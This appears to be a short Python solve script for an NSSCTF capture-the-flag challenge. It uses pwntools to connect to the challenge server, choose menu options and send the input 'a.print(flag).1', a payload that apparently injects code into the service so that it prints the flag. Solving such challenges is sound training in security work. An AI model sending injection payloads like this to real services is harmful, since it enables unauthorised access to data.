# https://www.nssctf.cn/problem/6314
import hashlib
import itertools
import string
import re
import gmpy2
import math
import requests 
from pwn import *
import numpy as np
from math import isqrt, gcd
from fractions import Fraction
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sympy

context.log_level = "debug"
conn = remote("node1.anna.nssctf.cn", 28499)
conn.recvuntil(b"Welcome to my supermarket\n")
conn.recvuntil(b'give me your choice\n')

conn.sendline(b"2")
conn.sendline(b"+")

conn.sendline(b"a.print(flag).1")
print(conn.recvline().strip().decode())